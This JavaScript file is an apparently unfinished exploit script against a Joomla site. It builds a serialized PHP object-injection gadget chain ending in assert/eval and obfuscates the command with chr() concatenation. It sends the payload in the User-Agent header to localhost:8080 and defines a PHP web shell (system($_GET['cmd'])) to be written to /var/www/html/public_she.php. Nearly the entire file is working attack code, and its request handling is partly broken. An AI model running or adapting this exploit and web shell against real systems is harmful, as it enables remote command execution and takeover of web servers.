import axios from "axios";

const PHP_SHELL_FILENAME = '/var/www/html/public_she.php'
const PHP_SHELL_FILECONTENT = `
    <?php
        \$cmd=\$_GET[\\'cmd\\'];
        echo system(\$cmd);
    ?>`

function encodeStringToChrConcat(string) {
    const characterArray = string.split('')

    let encoded = ''
    characterArray.forEach(char => {
        var ascii = char.charCodeAt(0)
        encoded += 'chr(' + ascii + ').'
    })

    // remove last . and return encoded string
    return encoded.substring(0, encoded.length - 1)
}

function generateInjectionPayload(payload) {
    const terminator = '\xf0\xfd\xfd\xfd'

    const exploitTemplate = `
        }__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\\\\0\\\\0\\\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";` +
        `s:` + payload.length + `:"` + payload + `;` +
        `JFactory::getConfig();exit";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\\\\0\\\\0\\\\0connection";b:1;}` +
        terminator

    return exploitTemplate
}

async function get(url, options = {}) {
    return axios.get(url, options)
        .then((response) => {
            console.log(response)
        })
        .catch(() => {
            console.log('Request did not work.')
        })

}

function injectCommand(cmd) {
    const systemCmd = 'system("' + cmd + '");'

    var encodedString = encodeStringToChrConcat(systemCmd)
    var phpPayload = 'eval(' + encodedString + ')'
    var injectionPayload = generateInjectionPayload(phpPayload)
    // works to here!

    console.log(injectionPayload)

    var cookies = axios.get("http://localhost:8080", {
        params: {
            'User-Agent': injectionPayload
        }
    })
        .then((response) => {
            return response.headers["set-cookie"]
        })
        .catch(() => {
            console.log('Request did not work.')
        })

    if (cookies == null) return

    axios.get("http://localhost:8080", {
        params: {
            'User-Agent': injectionPayload,
            credentials: 'include'
            }
        })
        .then((response) => {
                return response.headers["set-cookie"]
            })
    .catch(() => {
        console.log('Request did not work.')
    })
}

let string = "hello"

injectCommand('touch ' + PHP_SHELL_FILENAME)

// STEPS:
// - convert string to chr(xx).chr(xx) for PHP use
// - generate payload
// - 